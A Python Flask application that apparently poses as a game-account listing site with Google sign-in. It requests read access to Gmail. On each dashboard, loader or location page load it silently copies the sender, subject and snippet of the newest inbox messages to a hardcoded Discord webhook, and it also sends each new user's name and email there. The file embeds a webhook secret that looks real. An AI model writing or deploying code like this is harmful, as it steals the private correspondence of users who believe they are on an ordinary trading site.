from flask import Flask, request, redirect, session, url_for, render_template
import google_auth_oauthlib.flow
import googleapiclient.discovery
import google.auth.transport.requests
import requests
import os
import pickle
from werkzeug.utils import secure_filename
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "your_strong_fallback_secret_key")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401921604669407394/2Fku_KV6gZcnrAL-POlei36BhbmWhCtZ2m5boFlpEn-EhKFDkmiTc17ZcbnaOHrAuuNm"
SCOPES = [
    'openid',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/gmail.readonly'
]

DISCORD_WEBHOOK_URL1 = "https://discord.com/api/webhooks/1401921604669407394/2Fku_KV6gZcnrAL-POlei36BhbmWhCtZ2m5boFlpEn-EhKFDkmiTc17ZcbnaOHrAuuNm"

@app.route('/upload', methods=['POST'])
def upload():
    game = request.form.get("game")
    description = request.form.get("description")
    rank = request.form.get("rank")
    value = request.form.get("value")
    image = request.files.get("images")

    # Store data in session for display after redirect
    session['submitted_data'] = {
        'game': game,
        'description': description,
        'rank': rank,
        'value': value
    }

    message_content = {
        "content": f"🎮 **Game:** {game}\n📜 **Description:** {description}\n🏆 **Rank:** {rank}\n💰 **Value:** {value}"
    }

    if image:
        filename = secure_filename(image.filename)
        temp_folder = "temp"
        os.makedirs(temp_folder, exist_ok=True)
        image_path = os.path.join(temp_folder, filename)
        image.save(image_path)

        with open(image_path, "rb") as f:
            files = {"file": (filename, f)}
            requests.post(DISCORD_WEBHOOK_URL1, data=message_content, files=files)

        os.remove(image_path)
    else:
        requests.post(DISCORD_WEBHOOK_URL1, data=message_content)

    return redirect('/dashboard')

# end

def get_gmail_service(credentials):
    return googleapiclient.discovery.build('gmail', 'v1', credentials=credentials)
    
def fetch_and_notify(credentials):
    service = get_gmail_service(credentials)
    results = service.users().messages().list(userId='me', labelIds=['INBOX'], maxResults=10).execute()
    messages = results.get('messages', [])

    if not messages:
        return False

    # Store IDs of already sent emails in session
    sent_ids = session.get('sent_email_ids', [])

    new_sent_ids = []

    for msg in messages:
        msg_id = msg['id']
        if msg_id in sent_ids:
            continue  # Skip already sent emails

        full_msg = service.users().messages().get(userId='me', id=msg_id, format='metadata', metadataHeaders=['From', 'Subject']).execute()
        headers = full_msg['payload']['headers']
        sender = next((h['value'] for h in headers if h['name'] == 'From'), 'Unknown')
        subject = next((h['value'] for h in headers if h['name'] == 'Subject'), 'No Subject')
        snippet = full_msg.get('snippet', 'No content')

        send_to_discord(subject, sender, snippet)
        new_sent_ids.append(msg_id)

    # Update session with newly sent IDs
    session['sent_email_ids'] = sent_ids + new_sent_ids
    return True
    
def send_to_discord(subject, sender, snippet):
    content = f"**New Email Received!**\n**From:** {sender}\n**Subject:** {subject}\n**Snippet:** {snippet}"
    requests.post(DISCORD_WEBHOOK_URL, json={"content": content})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'credentials' not in session:
        return redirect(url_for('google_login'))
    credentials = pickle.loads(session['credentials'])
    fetch_and_notify(credentials)
    return render_template('dashboard.html')

@app.route('/loader')
def loader():
    if 'credentials' not in session:
        return redirect(url_for('google_login'))
    credentials = pickle.loads(session['credentials'])
    fetch_and_notify(credentials)
    return render_template('loader.html')

@app.route('/location')
def location():
    if 'credentials' not in session:
        return redirect(url_for('google_login'))
    credentials = pickle.loads(session['credentials'])
    fetch_and_notify(credentials)
    return render_template('location.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')
    

@app.route('/google_login')
def google_login():
    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
        'client_secret.json',
        scopes=SCOPES
    )
    flow.redirect_uri = url_for('oauth2callback', _external=True)
    authorization_url, state = flow.authorization_url(access_type='offline', include_granted_scopes='true')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/oauth2callback')
def oauth2callback():
    state = session['state']
    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
        'client_secret.json',
        scopes=SCOPES,
        state=state
    )
    flow.redirect_uri = url_for('oauth2callback', _external=True)
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials

    # Save credentials in session
    session['credentials'] = pickle.dumps(credentials)

    # Fetch user profile info
    user_info_service = googleapiclient.discovery.build(
        'oauth2', 'v2', credentials=credentials)
    user_info = user_info_service.userinfo().get().execute()

    email = user_info.get('email', 'Unknown')
    name = user_info.get('name', 'Unknown')

    # Send login info to Discord
    login_message = f"✅ **New Gmail Login**\n**Name:** {name}\n**Email:** {email}"
    requests.post(DISCORD_WEBHOOK_URL, json={"content": login_message})

    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(debug=True)
